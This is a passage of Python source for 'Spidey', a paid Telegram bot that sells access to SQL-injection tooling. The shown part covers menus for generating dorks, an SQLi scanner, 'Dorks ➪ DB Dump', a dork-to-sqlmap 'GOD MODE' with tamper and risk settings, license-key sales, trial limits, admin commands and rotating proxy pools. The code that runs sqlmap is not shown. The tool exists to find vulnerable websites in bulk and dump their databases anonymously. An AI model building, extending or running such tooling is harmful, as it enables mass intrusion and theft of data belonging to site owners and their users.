    if uid in banned_users: return False
    if is_admin(uid): return True
    if uid in authorized_users:
        if datetime.now() < authorized_users[uid]["expires"]: return True
        del authorized_users[uid]
    if trial_status(uid) == "active": return True
    return False

def effective_proxy_pool(uid):
    p = user_proxies.get(uid, [])
    return p if p else global_proxy_pool

def generate_key():
    parts = ["".join(random.choices(string.ascii_uppercase + string.digits, k=5)) for _ in range(4)]
    return "-".join(parts)

# ═══════════════════════════════════════════════════════════════════════════
#  📱  TELEGRAM UI
# ═══════════════════════════════════════════════════════════════════════════
MENU=0; KW_COUNT=1; KW_SEEDS=2; DORK_COUNT=3; DORK_KWS=4
PARSER_DORKS=5; PURCHASE_MENU=6; REDEEM_KEY=7; SQLI_URLS=9
DUMP_DORKS=10; URL_DUMP=11; GDORK_DUMP=13
_ADORK_KEYWORDS=20; _ADORK_DOMAINS=21; _ADORK_PARAMS=22
_ADORK_FILETYPES=23; _ADORK_SF=24; _ADORK_PF=25

def make_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥇 Gᴇɴ Kᴇʏᴡᴏʀᴅs", callback_data="menu_keywords"),
         InlineKeyboardButton("🥈 Gᴇɴ Dᴏʀᴋs", callback_data="menu_dorks")],
        [InlineKeyboardButton("🎖️ Gᴇɴ Dᴏʀᴋs V2", callback_data="menu_adorks"),
         InlineKeyboardButton("🥉 Dᴇᴇᴘ Pᴀʀsᴇʀ", callback_data="menu_parser")],
        [InlineKeyboardButton("🪷 HQ Sǫʟɪ Dᴏʀᴋs", callback_data="menu_hqdorks"),
         InlineKeyboardButton("🌍 Cᴏᴜɴᴛʀʏ Dᴏʀᴋs", callback_data="menu_countrydorks")],
        [InlineKeyboardButton("🦨 Cᴍs Dᴏʀᴋs", callback_data="menu_cmsdorks"),
         InlineKeyboardButton("🌫️ Exᴘᴏsᴇᴅ Dᴏʀᴋs", callback_data="menu_exposeddorks")],
        [InlineKeyboardButton("🦠 Sǫʟɪ Sᴄᴀɴɴᴇʀ", callback_data="menu_sqli")],
        [InlineKeyboardButton("🪵 Dᴏʀᴋs ➪ DB Dᴜᴍᴘ", callback_data="menu_dump"),
         InlineKeyboardButton("🎢 Uʀʟs ➪ DB Dᴜᴍᴘ", callback_data="menu_urldump")],
        [InlineKeyboardButton("🎯 GOD MODE (Dᴏʀᴋ➪Sǫʟᴍᴀᴘ)", callback_data="menu_gdork"),
         InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ", callback_data="menu_redeem")],
        [InlineKeyboardButton("🍷 Pʀᴇᴍɪᴜᴍ", callback_data="menu_purchase"),
         InlineKeyboardButton("🚸 Hᴏᴡ Tᴏ Usᴇ", callback_data="menu_guide")],
        [InlineKeyboardButton("🧛 Cᴏɴᴛᴀᴄᴛ", callback_data="menu_help")],
    ])

def make_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏ", callback_data="admin_genkey"),
         InlineKeyboardButton("📝 Lɪsᴛ Kᴇʏs", callback_data="admin_listkeys")],
        [InlineKeyboardButton("♻️ Rᴇᴠᴏᴋᴇ Kᴇʏ", callback_data="admin_revokekey"),
         InlineKeyboardButton("➕ Aᴅᴅ Usᴇʀ", callback_data="admin_adduser")],
        [InlineKeyboardButton("📛 Aᴄᴛɪᴠᴇ Usᴇʀs", callback_data="admin_users"),
         InlineKeyboardButton("📊 Bᴏᴛ Sᴛᴀᴛs", callback_data="admin_stats")],
        [InlineKeyboardButton("📣 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin_broadcast_info"),
         InlineKeyboardButton("⛔ Bᴀɴ Usᴇʀ", callback_data="admin_ban_info")],
        [InlineKeyboardButton("🚫 Bᴀɴ Lɪsᴛ", callback_data="admin_banlist"),
         InlineKeyboardButton("📤 Exᴘᴏʀᴛ Usᴇʀs", callback_data="admin_exportusers")],
        [InlineKeyboardButton("🌊 Pʀᴏxʏ Pᴏᴏʟ", callback_data="admin_gproxylist"),
         InlineKeyboardButton("🌬️ Cʟᴇᴀʀ Pʀᴏxɪᴇs", callback_data="admin_clearproxies")],
        [InlineKeyboardButton("🥷 Cʜᴇᴄᴋ Pʀᴏxɪᴇs", callback_data="admin_checkproxies"),
         InlineKeyboardButton("🛖 Sᴇʀᴠᴇʀ Iɴғᴏ", callback_data="admin_serverinfo")],
        [InlineKeyboardButton("🗂 Gᴇᴛ Bᴏᴛ Fɪʟᴇ", callback_data="admin_getfile")],
        [InlineKeyboardButton("⏪ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
    ])

def make_genkey_plan_menu():
    rows = [[InlineKeyboardButton(f"{e} {l}", callback_data=f"genkey_{c}")] for l,c,e,_ in PLANS]
    rows.append([InlineKeyboardButton("⬅️ Aᴅᴍɪɴ", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def make_purchase_menu():
    rows = [[InlineKeyboardButton(f"{e} {l} — {PLAN_PRICES.get(c,'?')}", callback_data=f"buy_{c}")] for l,c,e,_ in PLANS]
    rows.append([InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_back")])
    return InlineKeyboardMarkup(rows)

def make_sqlopts_menu(uid):
    o = _get_sqlopts(uid)
    eng_lbl = "Sᴡɪᴛᴄʜ ➪ Sᴜʙᴘʀᴏᴄᴇss" if o["engine"] == "api" else "Sᴡɪᴛᴄʜ ➪ Rᴇsᴛ Aᴘɪ"
    bulk_lbl = "Bulk OFF" if o["bulk"] else "Bulk ON"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥇 Lᴇᴠᴇʟ ▲", callback_data="sqlo_lvl_up"),
         InlineKeyboardButton("🥉 Lᴇᴠᴇʟ ▼", callback_data="sqlo_lvl_dn")],
        [InlineKeyboardButton("📈 Rɪsᴋ ▲", callback_data="sqlo_risk_up"),
         InlineKeyboardButton("📉 Rɪsᴋ ▼", callback_data="sqlo_risk_dn")],
        [InlineKeyboardButton("💡 Tᴇᴄʜ: BEUSTQ", callback_data="sqlo_tech_b"),
         InlineKeyboardButton("📛 Tᴇᴄʜ: EU", callback_data="sqlo_tech_eu")],
        [InlineKeyboardButton("🔻 Tᴀᴍᴘᴇʀ: Sᴛᴅ", callback_data="sqlo_tamp_std"),
         InlineKeyboardButton("🔺 Tᴀᴍᴘᴇʀ: Mᴀx", callback_data="sqlo_tamp_max")],
        [InlineKeyboardButton(f"🧶 Tʜʀᴇᴀᴅs: {o['threads']}", callback_data="sqlo_thr"),
         InlineKeyboardButton(f"🐊 Cʀᴀᴡʟ: {o['crawl']}", callback_data="sqlo_crawl")],
        [InlineKeyboardButton(f"🛶 {eng_lbl}", callback_data="sqlo_engine"),
         InlineKeyboardButton(f"🧳 {bulk_lbl}", callback_data="sqlo_bulk")],
        [InlineKeyboardButton("🔁 Rᴇsᴇᴛ", callback_data="sqlo_reset")],
        [InlineKeyboardButton("◀ Bᴀᴄᴋ", callback_data="sqlo_back")],
    ])

def _sqlopts_text(uid):
    o = _get_sqlopts(uid)
    eng = "🔌 REST API" if o["engine"] == "api" else "⚙️ Subprocess"
    bulk = "✅ ON" if o["bulk"] else "❌ OFF"
    return (f"⚙️ Sqlmap Settings\n\n"
            f"Level: `{o['level']}` (1-5)\nRisk: `{o['risk']}` (1-3)\n"
            f"Technique: `{o['technique']}`\nTamper: `{o['tamper'][:50]}`\n"
            f"Threads: `{o['threads']}`\nCrawl: `{o['crawl']}`\n"
            f"Engine: {eng}\nBulk: {bulk}")

def back_button(text="⬅️ Bᴀᴄᴋ", data="menu_back"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(text, callback_data=data)]])

def access_denied_text():
    lines = ["⛔ Aᴄᴄᴇss Dᴇɴɪᴇᴅ", "", "🍷 Pʟᴀɴs:"]
    for l,c,e,_ in PLANS: lines.append(f"  {e} {l} — `{PLAN_PRICES.get(c,'?')}`")
    lines.append(f"\n🆘 Aᴅᴍɪɴ: `{ADMIN_USERNAME}`")
    return "\n".join(lines)

def access_denied_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ", callback_data="menu_redeem"),
         InlineKeyboardButton("🍷 Pʟᴀɴs", callback_data="menu_purchase")],
        [InlineKeyboardButton("🆘 Cᴏɴᴛᴀᴄᴛ", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
    ])

def premium_locked_text():
    lines = ["🔒 Pʀᴇᴍɪᴜᴍ Lᴏᴄᴋᴇᴅ", "", "Yᴏᴜʀ Tʀɪᴀʟ Exᴘɪʀᴇᴅ", "", "🍷 Pʟᴀɴs:"]
    for l,c,e,_ in PLANS: lines.append(f"  {e} {l} — `{PLAN_PRICES.get(c,'?')}`")
    lines.append(f"\n🆘 `{ADMIN_USERNAME}`")
    return "\n".join(lines)

def premium_locked_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏖 Pʀɪᴄᴇ Lɪsᴛ", callback_data="menu_purchase")],
        [InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ", callback_data="menu_redeem")],
        [InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_back")],
    ])

BOOT_BANNERS = [
    "```\n✯ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙇𝙤𝙫𝙚𝙙 𝙗𝙮 𝙣𝙤𝙣𝙚..! ✯\n```",
    "```\n𖣔 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙂𝙤𝙙'𝙨 𝘿𝙚𝙫𝙤𝙩𝙚𝙚..! 𖣔\n```",
    "```\n𑁍 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙈𝙖𝙨𝙩𝙚𝙧 𝘿𝙪𝙢𝙥𝙚𝙧..! 𑁍\n```",
    "```\n❁ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙐𝙡𝙩𝙞𝙢𝙖𝙩𝙚 𝙬𝙖𝙧𝙧𝙞𝙤𝙧..! ❁\n```",
]

async def send_main_menu(update, context):
    banner = random.choice(BOOT_BANNERS)
    text = (f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n{banner}✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            "» 🕸️ Wʜᴀᴛ Cᴀɴ Sᴘɪᴅᴇʏ Dᴏ?\n\n"
            "🥇 Gᴇɴ Kᴇʏᴡᴏʀᴅs\n🥈 Gᴇɴ Dᴏʀᴋs\n🥉 Dᴇᴇᴘ Pᴀʀsᴇʀ\n"
            "🎖️ Gᴇɴ Dᴏʀᴋs V2\n🩻 Sǫʟɪ Sᴄᴀɴɴᴇʀ\n🪜 Dᴏʀᴋs ➪ DB Dᴜᴍᴘ\n"
            "🛰️ Uʀʟs ➪ DB Dᴜᴍᴘ\n🎯 GOD MODE\n🔑 Rᴇᴅᴇᴇᴍ\n🍷 Pʀᴇᴍɪᴜᴍ\n\n"
            "💡 Sᴛᴀʀᴛ Fʀᴏᴍ Bᴇʟᴏᴡ")
    if update.message:
        await update.message.reply_text(text, reply_markup=make_main_menu(), parse_mode=ParseMode.MARKDOWN)
    elif update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=make_main_menu(), parse_mode=ParseMode.MARKDOWN)

# ═══════════════════════════════════════════════════════════════════════════
#  🎮  COMMANDS
# ═══════════════════════════════════════════════════════════════════════════
async def start(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    first = uid not in all_user_ids and uid not in trial_users
    all_user_ids.add(uid)
    if first and not is_admin(uid) and uid not in authorized_users:
        trial_users[uid] = datetime.now()
        await update.message.reply_text(
            f"💥 Fʀᴇᴇ Tʀɪᴀʟ — {TRIAL_MINUTES} Mɪɴ\n\n"
            f"🍷 Bᴜʏ: `{ADMIN_USERNAME}`", parse_mode=ParseMode.MARKDOWN)
    if not has_access(uid):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    await send_main_menu(update, context)
    return MENU

async def admin_cmd(update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Nᴏᴛ Aᴅᴍɪɴ"); return MENU
    await update.message.reply_text(
        f"🧛 Aᴅᴍɪɴ Pᴀɴᴇʟ\n\nUsᴇʀs: `{len(all_user_ids)}`\n"
        f"Kᴇʏs: `{len(license_keys)}`\nBᴀɴɴᴇᴅ: `{len(banned_users)}`\n"
        f"Gʟᴏʙᴀʟ Pʀᴏxɪᴇs: `{len(global_proxy_pool)}`",
        reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
    return MENU

async def genkey_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    args = context.args
    if not args or args[0] not in PLAN_MAP:
        await update.message.reply_text(f"`/genkey <plan>` — {' | '.join(PLAN_MAP.keys())}", parse_mode=ParseMode.MARKDOWN)
        return MENU
    code = args[0]; label, emoji, delta = PLAN_MAP[code]
    key = generate_key()
    license_keys[key] = {"plan": code, "label": label, "emoji": emoji, "delta": delta,
                         "created_at": datetime.now(), "used_by": None}
    await update.message.reply_text(f"🔑 `{key}`\n{emoji} {label}", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def listkeys_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not license_keys: await update.message.reply_text("Nᴏ Kᴇʏs."); return MENU
    lines = ["🔑 Kᴇʏs:"]
    for k, i in list(license_keys.items())[:30]:
        s = f"Usᴇᴅ `{i['used_by']}`" if i["used_by"] else "✅ Fʀᴇᴇ"
        lines.append(f"`{k}` — {i['emoji']} {i['label']} — {s}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
    return MENU

async def users_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not authorized_users: await update.message.reply_text("Nᴏ Usᴇʀs."); return MENU
    lines = []
    for uid, info in list(authorized_users.items())[:30]:
        r = info["expires"] - datetime.now()
        if r.total_seconds() > 0:
            hrs = int(r.total_seconds() // 3600); mins = int((r.total_seconds() % 3600) // 60)
            lines.append(f"🍷 `{uid}` — {info['plan']} — `{hrs}ʜ {mins}ᴍ`")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
    return MENU

async def stats_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    await update.message.reply_text(
        f"📊 Kᴇʏs Gᴇɴ: `{len(license_keys)}`\n"
        f"Aᴄᴛɪᴠᴇ: `{sum(1 for i in authorized_users.values() if datetime.now() < i['expires'])}`\n"
        f"Tᴏᴛᴀʟ Usᴇʀs: `{len(all_user_ids)}`\n"
        f"Bᴀɴɴᴇᴅ: `{len(banned_users)}`",
        parse_mode=ParseMode.MARKDOWN)
    return MENU

async def adduser_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    args = context.args
    if len(args) < 2 or args[1] not in PLAN_MAP:
        await update.message.reply_text("`/adduser <uid> <plan>`", parse_mode=ParseMode.MARKDOWN); return MENU
    try: tid = int(args[0])
    except: return MENU
    label, emoji, delta = PLAN_MAP[args[1]]
    authorized_users[tid] = {"plan": label, "expires": datetime.now() + delta, "granted_by": "admin"}
    await update.message.reply_text(f"✅ Usᴇʀ `{tid}` — *{label}*", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def revokekey_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not context.args: return MENU
    key = context.args[0].upper()
    if key in license_keys:
        info = license_keys.pop(key)
        if info["used_by"] and info["used_by"] in authorized_users:
            del authorized_users[info["used_by"]]
        await update.message.reply_text(f"✅ Rᴇᴠᴏᴋᴇᴅ `{key}`.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Nᴏᴛ Fᴏᴜɴᴅ.", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def removeuser_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not context.args or not context.args[0].isdigit(): return MENU
    tid = int(context.args[0])
    if tid in authorized_users:
        del authorized_users[tid]
        await update.message.reply_text(f"✅ Rᴇᴍᴏᴠᴇᴅ `{tid}`.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"⚠️ Nᴏ Aᴄᴄᴇss.", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def checkuser_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not context.args or not context.args[0].isdigit(): return MENU
    tid = int(context.args[0])
    if tid in ADMIN_IDS:
        await update.message.reply_text(f"⚜️ `{tid}` Aᴅᴍɪɴ", parse_mode=ParseMode.MARKDOWN); return MENU
    if tid in authorized_users:
        info = authorized_users[tid]; r = info["expires"] - datetime.now()
        if r.total_seconds() > 0:
            hrs = int(r.total_seconds()//3600); mins = int((r.total_seconds()%3600)//60)
            await update.message.reply_text(f"🪀 `{tid}` — {info['plan']} — `{hrs}ʜ {mins}ᴍ`", parse_mode=ParseMode.MARKDOWN)
        else:
            del authorized_users[tid]
            await update.message.reply_text(f"❌ Exᴘɪʀᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"⚠️ Nᴏ Pʟᴀɴ.", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def banuser_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not context.args or not context.args[0].isdigit(): return MENU
    t = int(context.args[0])
    if t in ADMIN_IDS: await update.message.reply_text("Aᴅᴍɪɴ ᴄᴀɴ'ᴛ ʙᴇ ʙᴀɴɴᴇᴅ."); return MENU
    banned_users.add(t); _save_bans()
    await update.message.reply_text(f"🚫 `{t}` Bᴀɴɴᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def unbanuser_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    if not context.args or not context.args[0].isdigit(): return MENU
    t = int(context.args[0])
    banned_users.discard(t); _save_bans()
    await update.message.reply_text(f"✅ `{t}` Uɴʙᴀɴɴᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def broadcast_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    parts = update.message.text.split(maxsplit=1)
    if len(parts) < 2: await update.message.reply_text("`/broadcast <msg>`", parse_mode=ParseMode.MARKDOWN); return MENU
    msg = parts[1]; sent = 0; failed = 0
    for u in list(all_user_ids):
        try: await context.bot.send_message(u, msg); sent += 1
        except: failed += 1
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"📣 Sᴇɴᴛ: `{sent}` Fᴀɪʟ: `{failed}`", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def gproxy_cmd(update, context):
    global global_proxy_pool
    if not is_admin(update.effective_user.id): return MENU
    txt = update.message.text.split(maxsplit=1)
    if txt[0].lower().endswith("gproxies"):
        if not global_proxy_pool: await update.message.reply_text("Nᴏ Pʀᴏxɪᴇs."); return MENU
        lines = [f"{i}. `{p}`" for i,p in enumerate(global_proxy_pool[:25], 1)]
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN); return MENU
    if len(txt) < 2: return MENU
    arg = txt[1].strip()
    if arg.lower() == "clear":
        global_proxy_pool.clear(); _save_proxies()
        await update.message.reply_text("✅ Cʟᴇᴀʀᴇᴅ."); return MENU
    f = _parse_proxy(arg)
    if f in global_proxy_pool: await update.message.reply_text("Aʟʀᴇᴀᴅʏ Aᴅᴅᴇᴅ."); return MENU
    if await check_proxy_live(f, 5.0):
        global_proxy_pool.append(f); _save_proxies()
        await update.message.reply_text(f"✅ Aᴅᴅᴇᴅ. Tᴏᴛᴀʟ: `{len(global_proxy_pool)}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Dᴇᴀᴅ.")
    return MENU

async def setpr_cmd(update, context):
    uid = update.effective_user.id
    if not is_admin(uid) and not has_access(uid):
        await update.message.reply_text("❌ Nᴏ Aᴄᴄᴇss."); return MENU
    parts = update.message.text.split(maxsplit=1)
    cmd = parts[0].lstrip("/").lower()
    if cmd == "delpr":
        n = len(user_proxies.get(uid, [])); user_proxies.pop(uid, None); _save_proxies()
        await update.message.reply_text(f"🗑 Rᴇᴍᴏᴠᴇᴅ `{n}`", parse_mode=ParseMode.MARKDOWN); return MENU
    if cmd == "proxies":
        p = user_proxies.get(uid, [])
        if not p: await update.message.reply_text("Nᴏ Pʀᴏxɪᴇs."); return MENU
        await update.message.reply_text("\n".join(f"{i}. `{x}`" for i,x in enumerate(p[:20], 1)), parse_mode=ParseMode.MARKDOWN)
        return MENU
    # File upload
    doc = update.message.document or (update.message.reply_to_message.document if update.message.reply_to_message else None)
    if (len(parts) < 2 or not parts[1].strip()) and doc:
        return await _setpr_file(update, context, doc, uid)
    if len(parts) < 2: return MENU
    f = _parse_proxy(parts[1].strip())
    pool = user_proxies.setdefault(uid, [])
    if f in pool: await update.message.reply_text("Aʟʀᴇᴀᴅʏ Aᴅᴅᴇᴅ."); return MENU
    if await check_proxy_live(f, 5.0):
        pool.append(f); _save_proxies()
        await update.message.reply_text(f"✅ Aᴅᴅᴇᴅ. Tᴏᴛᴀʟ: `{len(pool)}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Dᴇᴀᴅ.")
    return MENU

async def _setpr_file(update, context, doc, uid):
    fname = (doc.file_name or "").lower()
    if not (fname.endswith((".txt",".zip",".text",".dat"))):
        await update.message.reply_text("❌ Sᴇɴᴅ .txt ᴏʀ .zip"); return MENU
    status = await update.message.reply_text("📩 Dᴏᴡɴʟᴏᴀᴅɪɴɢ...", parse_mode=ParseMode.MARKDOWN)
    try:
        tgf = await context.bot.get_file(doc.file_id)
        buf = io.BytesIO(); await tgf.download_to_memory(buf); buf.seek(0)
        raw = buf.read()
    except Exception as e:
        await status.edit_text(f"❌ `{e}`", parse_mode=ParseMode.MARKDOWN); return MENU
    proxies = []
    try:
        if fname.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                for n in zf.namelist():
                    if n.lower().endswith((".txt",".text",".dat")) and not n.startswith("__"):
                        with zf.open(n) as f:
                            for line in f.read().decode("utf-8", errors="ignore").splitlines():
                                line = line.strip()
                                if line and ":" in line and not line.startswith(("#","[")) and "=" not in line:
                                    pp = _parse_proxy(line)
                                    if pp: proxies.append(pp)
        else:
            for line in raw.decode("utf-8", errors="ignore").splitlines():
                line = line.strip()
                if line and ":" in line and not line.startswith(("#","[")) and "=" not in line:
                    pp = _parse_proxy(line)
                    if pp: proxies.append(pp)
    except Exception as e:
        await status.edit_text(f"❌ `{e}`", parse_mode=ParseMode.MARKDOWN); return MENU
    if not proxies:
        await status.edit_text("❌ Nᴏ Pʀᴏxɪᴇs Fᴏᴜɴᴅ."); return MENU
    pool = user_proxies.setdefault(uid, [])
    unique = list(dict.fromkeys(p for p in proxies if p not in pool))
    await status.edit_text(f"🔍 Cʜᴇᴄᴋɪɴɢ `{len(unique)}`...", parse_mode=ParseMode.MARKDOWN)
    last_edit = [0.0]
    async def on_prog(ck, tot, lv):
        now = time.monotonic()
        if now - last_edit[0] < 3.0: return
        last_edit[0] = now
        pct = int(ck/tot*100) if tot else 0
        bar = "█"*(pct//10) + "░"*(10 - pct//10)
        try:
            await status.edit_text(f"🔍 Cʜᴇᴄᴋɪɴɢ\n`{bar}` {pct}%\nCʜᴇᴄᴋᴇᴅ `{ck}`/`{tot}`\nLɪᴠᴇ `{lv}`", parse_mode=ParseMode.MARKDOWN)
        except: pass
    live = await check_proxies_bulk(unique, timeout=6.0, concurrency=300, progress_callback=on_prog)
    pool.extend(live); _save_proxies()
    await status.edit_text(
        f"✅ Pʀᴏxɪᴇs Aᴅᴅᴇᴅ\n\nCʜᴇᴄᴋᴇᴅ: `{len(unique)}`\nLɪᴠᴇ: `{len(live)}`\nPᴏᴏʟ: `{len(pool)}`",
        parse_mode=ParseMode.MARKDOWN)
    return MENU

async def getfile_cmd(update, context):
    if not is_admin(update.effective_user.id): return MENU
    fp = os.path.abspath(__file__)
    with open(fp, "rb") as f: content = f.read()
    ts = datetime.now().strftime("%d%m%y_%H%M")
    lines = len(content.decode("utf-8", errors="ignore").splitlines())
    await context.bot.send_document(chat_id=update.effective_user.id,
        document=io.BytesIO(content), filename=f"spidey_{ts}.py",
        caption=f"🕷️ Sᴏᴜʀᴄᴇ — {lines:,} lines", parse_mode=ParseMode.MARKDOWN)
    return MENU

# ═══════════════════════════════════════════════════════════════════════════
#  🎮  BUTTON HANDLER
# ═══════════════════════════════════════════════════════════════════════════
async def button_handler(update, context):
    q = update.callback_query; await q.answer()
    data = q.data; uid = update.effective_user.id
    FREE = {"menu_purchase","menu_redeem","menu_back","stop_parser","stop_sqli","stop_dump","menu_help"}
    if (not has_access(uid) and trial_status(uid) == "expired" and not is_admin(uid)
            and data not in FREE and not data.startswith(("admin_","plan_","redeem","buy_","genkey_"))):
        try: await q.edit_message_text(premium_locked_text(), reply_markup=premium_locked_kb(), parse_mode=ParseMode.MARKDOWN)
        except: await q.answer("🍷 Pʀᴇᴍɪᴜᴍ Oɴʟʏ", show_alert=True)
        return MENU
    if data in ("stop_parser","stop_sqli","stop_dump"):
        if uid in stop_events: stop_events[uid].set()
        try: await q.edit_message_text("⛔ Sᴛᴏᴘᴘᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
        except: pass
        return MENU
    if data == "menu_back":
        context.user_data.clear()
        if has_access(uid) or trial_status(uid) == "expired":
            await send_main_menu(update, context)
        else:
            await q.edit_message_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU

    # Admin buttons
    if data == "admin_panel":
        if not is_admin(uid): return MENU
        await q.edit_message_text("🧛 Aᴅᴍɪɴ Pᴀɴᴇʟ", reply_markup=make_admin_menu()); return MENU
    if data == "admin_genkey":
        if not is_admin(uid): return MENU
        await q.edit_message_text("🔑 Sᴇʟᴇᴄᴛ Pʟᴀɴ:", reply_markup=make_genkey_plan_menu()); return MENU
    if data.startswith("genkey_"):
        if not is_admin(uid): return MENU
        code = data[7:]
        if code not in PLAN_MAP: return MENU
        label, emoji, delta = PLAN_MAP[code]; key = generate_key()
        license_keys[key] = {"plan": code, "label": label, "emoji": emoji, "delta": delta,
                             "created_at": datetime.now(), "used_by": None}
        await q.edit_message_text(f"🔑 `{key}`\n{emoji} {label}", reply_markup=make_genkey_plan_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_listkeys":
        if not is_admin(uid): return MENU
        if not license_keys: await q.edit_message_text("Nᴏ Kᴇʏs."); return MENU
        lines = [f"`{k}` — {i['emoji']} {i['label']}" for k,i in list(license_keys.items())[:30]]
        await q.edit_message_text("\n".join(lines), reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_revokekey":
        if not is_admin(uid): return MENU
        await q.edit_message_text("♻️ Usᴇ `/revokekey <KEY>`\n\n" +
            ("\n".join(f"`{k}`" for k in list(license_keys.keys())[:20]) or "Nᴏ Kᴇʏs."),
            reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_adduser":
        if not is_admin(uid): return MENU
        await q.edit_message_text("➕ `/adduser <uid> <plan>`", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_users":
        if not is_admin(uid): return MENU
        lines = []
        for u,i in list(authorized_users.items())[:30]:
            if datetime.now() < i["expires"]:
                r = i["expires"] - datetime.now()
                lines.append(f"`{u}` — {i['plan']} — {int(r.total_seconds()//3600)}ʜ")
        await q.edit_message_text("\n".join(lines) or "Nᴏ Usᴇʀs.", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_stats":
        if not is_admin(uid): return MENU
        await q.edit_message_text(
            f"📊 Usᴇʀs `{len(all_user_ids)}`\nKᴇʏs `{len(license_keys)}`\n"
            f"Aᴄᴛɪᴠᴇ `{sum(1 for i in authorized_users.values() if datetime.now() < i['expires'])}`\n"
            f"Bᴀɴɴᴇᴅ `{len(banned_users)}`\nGʟᴏʙᴀʟ Pʀᴏxɪᴇs `{len(global_proxy_pool)}`",
            reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_broadcast_info":
        if not is_admin(uid): return MENU
        await q.edit_message_text(f"📣 `/broadcast <msg>`\nUsᴇʀs: `{len(all_user_ids)}`", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_ban_info":
        if not is_admin(uid): return MENU
        await q.edit_message_text(f"⛔ `/banuser <id>`\n`/unbanuser <id>`\nBᴀɴɴᴇᴅ: `{len(banned_users)}`", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_banlist":
        if not is_admin(uid): return MENU
        txt = "\n".join(f"• `{u}`" for u in sorted(banned_users)) or "_Eᴍᴘᴛʏ_"
        await q.edit_message_text(f"🚫 Bᴀɴɴᴇᴅ ({len(banned_users)}):\n{txt}", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_exportusers":
        if not is_admin(uid): return MENU
        lines = [f"# Export {datetime.now()}", f"Total: {len(all_user_ids)}", ""]
        for u in sorted(all_user_ids): lines.append(str(u))
        await q.answer("Sᴇɴᴅɪɴɢ...")
        await context.bot.send_document(chat_id=uid,
            document=io.BytesIO("\n".join(lines).encode()),
            filename=f"users_{datetime.now():%d%m%y}.txt",
            caption=f"📤 `{len(all_user_ids)}` Usᴇʀs", parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_gproxylist":
        if not is_admin(uid): return MENU
